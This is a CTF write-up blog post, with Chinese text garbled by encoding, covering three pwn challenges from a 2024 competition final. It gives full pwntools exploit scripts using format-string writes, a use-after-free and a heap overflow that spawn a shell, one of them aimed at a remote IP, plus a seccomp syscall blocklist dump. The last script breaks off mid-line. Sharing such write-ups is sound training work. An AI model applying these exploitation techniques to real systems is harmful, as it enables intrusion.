    <content type="html"><![CDATA[<p>o4èµ¢ï¼å¯æƒœæ²¡æœ‰æ’è¡Œæ¦œæˆªå›¾QAQ</p><p>awdp webå’Œpwnéƒ½æ²¡æ‰“å¥½ä½†å¯ä¿¡ä¸Šå¤§åˆ†çš„ä¸€é›†</p><span id="more"></span><h1 id="anime"><a href="#anime" class="headerlink" title="anime"></a>anime</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ€è·¯â€œéš”å±±æ‰“ç‰›â€</p><h2 id="ä¸€äº›è‡ªæˆ‘åçœï¼šï¼‰"><a href="#ä¸€äº›è‡ªæˆ‘åçœï¼šï¼‰" class="headerlink" title="ä¸€äº›è‡ªæˆ‘åçœï¼šï¼‰"></a>ä¸€äº›è‡ªæˆ‘åçœï¼šï¼‰</h2><p><em>è¿™é¢˜æ¯”èµ›çš„æ—¶å€™å°±å‡ºäº†ï¼Œå†™åœ¨è¿™é‡Œåªæ˜¯ä¸ºäº†è‡ªæˆ‘åçœä¸€ä¸‹ï¼ˆ</em></p><p>æŸæ¬¡æ¯”èµ›çš„æ—¶å€™åšè¿‡è¿™ç§æ€è·¯çš„é¢˜ï¼Œä¸€æ—¶æ²¡æƒ³èµ·æ¥ï¼Œæ„Ÿè§‰æˆ‘éœ€è¦æœ¬åœ°æ­ä¸ªçŸ¥è¯†åº“ä¹‹ç±»çš„ä¸œè¥¿â€¦è®°å¿†åŠ›å¤ªå·®äº†ï¼Œå¾ˆç®€å•çš„ä¸€é“é¢˜è€—æ—¶å¤ªå¤šï¼Œåé¢æ²¡æ—¶é—´äº†ä¸ç„¶æ„Ÿè§‰ezheapä¹Ÿèƒ½å‡º</p><p>å¦å¤–æœ€è¿‘æ€ç»´æœ‰ç‚¹åƒµï¼ŒçŠ¶æ€æœ‰ç‚¹ç±»ä¼¼åˆšå‡é«˜ä¸‰çš„æ—¶å€™ï¼ŒcorCTFä¹Ÿæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ€è·¯æ­£ç¡®è½¬ä¸ªå¼¯å°±æœ‰ä¸€ä¸ªæ›´å¿«çš„æ–¹æ³•ï¼Œç¡¬æ˜¯æ²¡æƒ³åˆ°ï¼ŒTplusè¯´çš„æ—¶å€™æˆ‘å¿«æ°”æ­»äº†â€¦â€¦æˆ‘æ€ä¹ˆå¯ä»¥æƒ³ä¸åˆ°ï¼Œä¹‹å‰RWçš„æ—¶å€™ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µ</p><p>è¯„ä»·æ˜¯æœ€è¿‘è¿˜æ˜¯è„‘å­åŠ¨å°‘äº†ï¼Œ<del>å†™å‰ç«¯å†™çš„</del></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">from</span> aeslc <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getstr</span>(<span class="hljs-params">content</span>):<br>    key=<span class="hljs-string">b&#x27;\x7b\xf3\x5c\xd6\x9c\x47\x5d\x5e\x6f\x1d\x7a\x23\x18\x7b\xf9\x34&#x27;</span><br>    aes=AES(key=key)<br>    enc=content<br>    dec=aes.AES_encrypt(<span class="hljs-string">&quot;AES_ECB&quot;</span>,enc)<br>    <span class="hljs-keyword">return</span> dec<br><br>p=remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>,<span class="hljs-number">26563</span>)<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#payload=b&#x27;a&#x27;*8+b&#x27;\x60\x80&#x27;</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;linsir want to know your name\n&#x27;</span>,payload)<br>p.sendafter(<span class="hljs-string">b&#x27;what\&#x27;s your favourite anime: &#x27;</span>,getstr(<span class="hljs-string">b&#x27;%15$p%17$p%11$p\xff&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libcbase=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x24083</span><br>stack=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)<br>pie=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\xff&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x11e0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((stack-<span class="hljs-number">0x124</span>)&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%6$hn&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br>payload=<span class="hljs-string">b&#x27;%30c%45$hhn&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br><span class="hljs-comment">#payload=b&#x27;%&#x27;+str((stack-0x118)&amp;0xffff).encode()+b&#x27;c&#x27;+b&#x27;%6hn&#x27;</span><br><span class="hljs-comment">#p.sendafter(b&#x27;anime: &#x27;,getstr(payload))</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params">addr,value</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((addr+i*<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%6$hn&#x27;</span><br>        p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br>        payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((value&gt;&gt;(<span class="hljs-number">16</span>*i))&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%45$hn&#x27;</span><br>        p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br><br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libcbase<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>binsh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ret=libcbase+<span class="hljs-number">0x0000000000022679</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>hack(stack-<span class="hljs-number">0xf0</span>,ret)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">8</span>,rdi)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x10</span>,binsh)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x18</span>,system)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li><p><strong>æ¼æ´ç‚¹</strong>ï¼šä¸€ä¸ªuafï¼Œä¸€ä¸ªoverflow</p><p><em>åšç€åšç€å¿˜äº†æœ‰ä¸ªoverflowï¼Œå†æ¬¡ä½è¯wjyæœ€è¿‘è„‘å­ä¸å¥½ä½¿</em></p></li><li><p><strong>äº¤äº’</strong>ï¼šæœ‰åºåˆ—åŒ–ï¼Œéœ€è¦é€†ä¸€ä¸‹ï¼Œèµ›æ—¶è§‰å¾—æ—¶é—´ä¸å¤Ÿäº†ï¼Œé reæ‰‹é€†äº†ä¸€äº›åç›´æ¥å¼€çŒœï¼ŒåŠé€†åŠçŒœä¹Ÿæ˜¯æŠŠäº¤äº’é—®é¢˜è§£å†³äº†</p><ul><li>æœ‰ä¸€ä¸ªæ¯”è¾ƒéš¾æçš„é—®é¢˜å°±æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œ7fä»¥ä¸‹ç”¨unicodeï¼Œ7fä»¥ä¸Šç›´æ¥\xå°±è¡Œï¼Œ<em>è¿™ä¹Ÿæ˜¯è¯•å‡ºæ¥çš„</em></li></ul></li><li><p><strong>ä¸€äº›é—®é¢˜</strong>ï¼šå› ä¸ºåºåˆ—åŒ–å †éå¸¸ä¹±ï¼Œ<em>èµ›æ—¶å¡æ³„æ¼å¡åˆ°æœ€åï¼Œèµ›åæ²¡å¤šä¹…ä¹Ÿå‡ºäº†ï¼Œä½†å †å¸ƒå±€å¡çš„å¾ˆæ­»ï¼Œä¸çŸ¥é“è¿œç¨‹ä¼šä¸ä¼šæœ‰é—®é¢˜</em></p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getpack</span>():<br>    pack=<span class="hljs-string">b&#x27;\xef\xbb\xbf&#x27;</span><br>    <span class="hljs-keyword">return</span> pack<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getmethod</span>(<span class="hljs-params">choice,idx,size,mess</span>):<br>    payload=<span class="hljs-string">b&#x27;&#123;&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;choice&quot;:&#x27;</span>+choice+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;index&quot;:&#x27;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;length&quot;:&#x27;</span>+<span class="hljs-built_in">str</span>(size).encode()+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;message&quot;:&quot;&#x27;</span>+mess+<span class="hljs-string">b&#x27;&quot;&#125;&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,mess</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;new&quot;&#x27;</span>,<span class="hljs-number">0</span>,size,mess))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;rm&quot;&#x27;</span>,idx,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;view&quot;&#x27;</span>,idx,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;modify&quot;&#x27;</span>,idx,size,content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deal</span>(<span class="hljs-params">content</span>):<br>    var=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-keyword">if</span> num&gt;=<span class="hljs-number">0x80</span>:<br>            var+=num.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            var+=<span class="hljs-string">b&#x27;\\u00&#x27;</span>+<span class="hljs-built_in">hex</span>(num)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>).encode()<br>    <span class="hljs-keyword">return</span> var<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)    <span class="hljs-comment">#0</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>off0=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;bbb&#x27;</span>)    <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x1e0</span>+<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;ccc&#x27;</span>)    <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;ddd&#x27;</span>)    <span class="hljs-comment">#3</span><br>off1=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:&#x27;</span>)<br>heap=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-(off0&amp;<span class="hljs-number">0xfff</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>payload=<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">b&#x27;\\u0051\\u0002&#x27;</span>+<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*(<span class="hljs-number">6</span>+<span class="hljs-number">0x240</span>+<span class="hljs-number">8</span>)+<span class="hljs-string">b&#x27;\\u0021\\u000e&#x27;</span>+<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>+<span class="hljs-number">0x250</span>,payload)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1ecbe0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,deal(p64(libcbase+<span class="hljs-number">0x1eee48</span>)))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\\u0000&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,deal(p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])))<br>delete(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="CHR"><a href="#CHR" class="headerlink" title="CHR"></a>CHR</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li><p>è¿™æ¬¡å›½èµ›çš„ä¸»é¢˜å°±æ˜¯æ··ä¹±çš„å †ï¼šï¼‰</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/bins.png" class title="bins"></li><li><p>å¼€äº†æ²™ç®±ï¼Œé»‘åå•ï¼Œç›´æ¥orwå°±è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span><br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x1e 0xc000003e  if (A != ARCH_X86_64) goto 0032<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x1b 0xffffffff  if (A != 0xffffffff) goto 0032<br> 0005: 0x15 0x1a 0x00 0x00000038  if (A == clone) goto 0032<br> 0006: 0x15 0x19 0x00 0x00000039  if (A == fork) goto 0032<br> 0007: 0x15 0x18 0x00 0x0000003a  if (A == vfork) goto 0032<br> 0008: 0x15 0x17 0x00 0x0000003b  if (A == execve) goto 0032<br> 0009: 0x15 0x16 0x00 0x0000003e  if (A == kill) goto 0032<br> 0010: 0x15 0x15 0x00 0x00000052  if (A == rename) goto 0032<br> 0011: 0x15 0x14 0x00 0x00000054  if (A == rmdir) goto 0032<br> 0012: 0x15 0x13 0x00 0x00000057  if (A == unlink) goto 0032<br> 0013: 0x15 0x12 0x00 0x0000005a  if (A == chmod) goto 0032<br> 0014: 0x15 0x11 0x00 0x0000005b  if (A == fchmod) goto 0032<br> 0015: 0x15 0x10 0x00 0x0000005c  if (A == chown) goto 0032<br> 0016: 0x15 0x0f 0x00 0x0000005d  if (A == fchown) goto 0032<br> 0017: 0x15 0x0e 0x00 0x00000065  if (A == ptrace) goto 0032<br> 0018: 0x15 0x0d 0x00 0x00000069  if (A == setuid) goto 0032<br> 0019: 0x15 0x0c 0x00 0x0000006a  if (A == setgid) goto 0032<br> 0020: 0x15 0x0b 0x00 0x00000071  if (A == setreuid) goto 0032<br> 0021: 0x15 0x0a 0x00 0x00000072  if (A == setregid) goto 0032<br> 0022: 0x15 0x09 0x00 0x00000075  if (A == setresuid) goto 0032<br> 0023: 0x15 0x08 0x00 0x00000077  if (A == setresgid) goto 0032<br> 0024: 0x15 0x07 0x00 0x0000009d  if (A == prctl) goto 0032<br> 0025: 0x15 0x06 0x00 0x000000c8  if (A == tkill) goto 0032<br> 0026: 0x15 0x05 0x00 0x000000ea  if (A == tgkill) goto 0032<br> 0027: 0x15 0x04 0x00 0x00000104  if (A == fchownat) goto 0032<br> 0028: 0x15 0x03 0x00 0x00000107  if (A == unlinkat) goto 0032<br> 0029: 0x15 0x02 0x00 0x0000010c  if (A == fchmodat) goto 0032<br> 0030: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0032<br> 0031: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0032: 0x06 0x00 0x00 0x00000000  return KILL<br></code></pre></td></tr></table></figure></li><li><p>æ¼æ´ç‚¹åœ¨convertï¼Œconvertç”³è¯·äº†ä¸€ä¸ª4å€sizeçš„chunkä½†ç”¨çš„è¿˜æ˜¯åŸæ¥é‚£ä¸ª</p></li><li><p>ç”±äºæ˜¯å­—ç¬¦é›†è½¬æ¢çŒœæµ‹ä½¿ç”¨ä¸­æ–‡ï¼Œå°è¯•å‘ç°ä¸€ä¸ªä¸­æ–‡åœ¨è½¬æ¢åä¼šæœ‰5å­—èŠ‚æº¢å‡ºï¼Œå¯ä»¥æ”¹next chunkçš„size</p></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>å…¶å®æŒºç®€å•çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x290</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x318</span>,<span class="hljs-string">&#x27;çƒ«&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x310</span>+<span class="hljs-string">b&#x27;\x11\x05&#x27;</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 